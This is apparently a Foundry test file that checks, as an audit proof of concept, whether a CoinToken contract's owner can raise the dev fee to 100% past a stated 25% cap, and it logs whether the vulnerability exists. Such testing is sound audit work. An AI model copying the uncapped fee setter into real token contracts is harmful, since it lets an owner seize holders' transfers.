// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CoinToken.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x12345); // Return a valid non-zero pair address
    }
}

contract MockRouter {
    address public factory;
    address public constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor() {
        factory = address(new MockFactory());
    }
}

contract CoinTokenFeeTest is Test {
    CoinToken token;
    address owner = address(0x123);
    address feeAddress = address(0x456);
    uint8 decimals = 9;
    
    function setUp() public {
        // Deploy mock router with factory support
        MockRouter mockRouter = new MockRouter();
        
        vm.prank(owner);
        token = new CoinToken(
            "TestToken",
            "TST",
            decimals,
            1000000000 * (10 ** decimals), // 1B token supply
            1,                            // Initial tax fee
            2,                            // Initial liquidity fee
            3,                            // Initial dev fee
            address(mockRouter),           // Mock router address
            feeAddress,
            owner
        );
    }

    function test_DevFeeCanExceed25Percent() public {
        // State before attack
        uint256 devFeeBefore = token._devFee();
        console.log("Dev Fee (before): %s", devFeeBefore);
        
        // Attack operation - set dev fee to 100%
        console.log("--- Trigger setDevFeePercent(100) ---");
        uint256 excessFee = 100; // 100% fee
        vm.prank(owner);
        token.setDevFeePercent(excessFee);

        // State after attack
        uint256 devFeeAfter = token._devFee();
        console.log("Dev Fee (after): %s", devFeeAfter);
        
        // Differential verification
        if (devFeeAfter == 100) {
            console.log("Vulnerability Exists: Dev fee was successfully set to 100% (exceeds 25% limit)");
        } else {
            console.log("Vulnerability not Exist: Dev fee remains at %s (within safe limits)", devFeeAfter);
        }
    }
}